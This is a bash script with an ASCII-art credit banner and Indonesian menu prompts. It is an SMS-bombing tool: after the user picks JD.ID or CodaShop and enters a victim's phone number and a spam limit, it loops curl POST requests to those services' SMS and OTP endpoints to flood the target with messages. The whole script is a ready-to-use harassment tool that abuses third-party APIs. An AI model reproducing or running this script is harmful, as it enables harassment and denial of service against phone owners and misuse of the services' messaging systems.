while true;
do
cat << "CREDIT"

██████╗ ███████╗██████╗ ███████╗███████╗████████╗ ██████╗ ██╗  ██╗
██╔══██╗██╔════╝██╔══██╗╚══███╔╝██╔════╝╚══██╔══╝██╔═████╗██║  ██║
██████╔╝█████╗  ██║  ██║  ███╔╝ █████╗     ██║   ██║██╔██║███████║
██╔══██╗██╔══╝  ██║  ██║ ███╔╝  ██╔══╝     ██║   ████╔╝██║╚════██║
██████╔╝███████╗██████╔╝███████╗███████╗   ██║   ╚██████╔╝     ██║
╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝   ╚═╝    ╚═════╝      ╚═╝
                                                                  

[1]. JD.ID
[2]. CodaShop
CREDIT

echo -ne 'Pilih : ';read numb;
echo '';

	if [[ ${numb} == '1' ]];then
		url="http://sc.jd.id/phone/sendPhoneSms"
		read -p "[+] Target	: " target
		read -p "[+] Spam Limit	: " limit
		echo -ne "\n"
		for i in $(seq 1 $limit):
  	do
		payload=$(curl -X POST --silent $url -d "phone=$target&smsType=1")
	
	if [[ $payload =~ 'true' ]]; then
		echo "[+][$i] SUCCESS ~> $target"
	else
		echo "[-][$i] FAILED  ~> $target"
	fi
	sleep 1
	done

	elif [[ ${numb} == '2' ]]; then
		url="https://airtime.codapayments.com/airtime/msisdn"
		read -p "[+] Target	: " target
		read -p "[+] Spam Limit	: " limit
		read -p "[+] TxnId	: " txn
		echo -ne "\n"

		for i in $(seq 1 $limit):
  do
		payload=$(curl -X POST --silent $url -d "TxnId=$txn&MnoId=0&input_phone_number=$target&ga_client_id=1108583962.1528628164")
	
	if [[ $payload ]]; then
		echo "[+][$i] SUCCESS ~> $target"
	else
		echo "[-][$i] FAILED  ~> $target"
	fi
	sleep 1
	done
	else
		echo '[-] Gblk Sia!'
	fi
done